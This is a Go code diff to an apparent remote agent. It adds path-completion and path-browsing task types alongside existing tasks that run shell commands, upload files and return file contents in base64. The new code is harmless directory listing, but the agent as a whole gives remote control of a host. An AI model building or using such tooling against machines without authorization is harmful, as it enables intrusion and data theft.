@@ -3,10 +3,12 @@ package agent
 import (
 	"context"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
 	"runtime"
+	"sort"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -38,6 +40,17 @@ func executeTask(t *protocol.Task) *protocol.TaskResult {
 		}
 	case "download":
 		output, taskErr = downloadFile(t.Payload)
+	case "complete":
+		extendPathBrowseFastWindow()
+		output, taskErr = completePath(t.Payload)
+	case "pathbrowse":
+		if t.Payload == "start" {
+			extendPathBrowseFastWindow()
+			output = "path browser ready"
+		} else {
+			stopPathBrowseFastWindow()
+			output = "path browser stopped"
+		}
 	case "upload":
 		output, taskErr = uploadFile(t.Payload)
 	case "interactive":
@@ -60,6 +73,13 @@ func executeTask(t *protocol.Task) *protocol.TaskResult {
 	}
 
 	return &protocol.TaskResult{TaskID: t.ID, Type: t.Type, Output: output, Error: taskErr}
+}
+
+type pathCompletionResult struct {
+	Input  string   `json:"input"`
+	Common string   `json:"common"`
+	Items  []string `json:"items"`
+	More   bool     `json:"more"`
 }
 
 // runShell executes a shell command and returns combined stdout/stderr.
@@ -99,6 +119,84 @@ func downloadFile(path string) (string, string) {
 		return "", err.Error()
 	}
 	return base64.StdEncoding.EncodeToString(data), ""
+}
+
+func completePath(input string) (string, string) {
+	input = strings.TrimSpace(input)
+	dir, prefix := splitCompletionInput(input)
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return "", err.Error()
+	}
+
+	var items []string
+	for _, entry := range entries {
+		name := entry.Name()
+		if !strings.HasPrefix(name, prefix) {
+			continue
+		}
+		item := joinCompletionPath(dir, name, entry.IsDir())
+		items = append(items, item)
+	}
+	sort.Strings(items)
+
+	result := pathCompletionResult{
+		Input:  input,
+		Common: longestCommonPrefix(items),
+		Items:  items,
+	}
+	encoded, err := json.Marshal(result)
+	if err != nil {
+		return "", err.Error()
+	}
+	return string(encoded), ""
+}
+
+func splitCompletionInput(input string) (string, string) {
+	if input == "" {
+		return ".", ""
+	}
+	idx := strings.LastIndexAny(input, `/\`)
+	if idx < 0 {
+		return ".", input
+	}
+	dir := input[:idx+1]
+	prefix := input[idx+1:]
+	if dir == "" {
+		dir = "."
+	}
+	return dir, prefix
+}
+
+func joinCompletionPath(dir, name string, isDir bool) string {
+	if dir == "." {
+		dir = ""
+	}
+	path := dir + name
+	if isDir && !strings.HasSuffix(path, "/") && !strings.HasSuffix(path, `\`) {
+		if strings.Contains(dir, `\`) {
+			path += `\`
+		} else {
+			path += "/"
+		}
+	}
+	return path
+}
+
+func longestCommonPrefix(items []string) string {
+	if len(items) == 0 {
+		return ""
+	}
+	prefix := items[0]
+	for _, item := range items[1:] {
+		for !strings.HasPrefix(item, prefix) {
+			if prefix == "" {
+				return ""
+			}
+			prefix = prefix[:len(prefix)-1]
+		}
+	}
+	return prefix
 }
 
 // uploadFile writes base64-encoded data to a path on the agent filesystem.
